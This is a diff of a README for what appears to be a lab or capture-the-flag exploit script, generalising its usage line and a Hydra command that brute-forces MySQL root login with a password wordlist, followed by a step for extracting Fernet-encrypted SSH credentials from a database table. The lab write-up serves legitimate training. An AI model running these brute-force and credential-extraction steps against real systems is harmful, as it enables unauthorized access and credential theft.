@@ -1,7 +1,8 @@
 # Offsec-pyExp
 
 ```
-Usage : python3 resolv-pyExp.py -i 192.168.182.118 -p 3306 -w /usr/share/wordlists/rockyou.txt
+Usage : python3 resolv-pyExp.py -i <IP_ADDRESS> -p 3306 -w <WORDLIST>
+
 ```
 
 Specific Steps for pyExp
@@ -11,7 +12,7 @@ Reconnaissance: Scan to identify running services, particularly MySQL (tcp/3306)
 Brute Force MySQL: Use Hydra to brute force MySQL access using the wordlist /usr/share/wordlist/rockyou.txt.
 
 ```bash
-hydra -l root -P /usr/share/wordlist/rockyou.txt mysql://<IP_ADDRESS>:3306
+hydra -l root -P <WORDLIST> mysql://<IP_ADDRESS>:3306
 ```
 Database Access: Extract the encrypted SSH credentials via the symmetric Fernet algorithm from the `data` table.
 
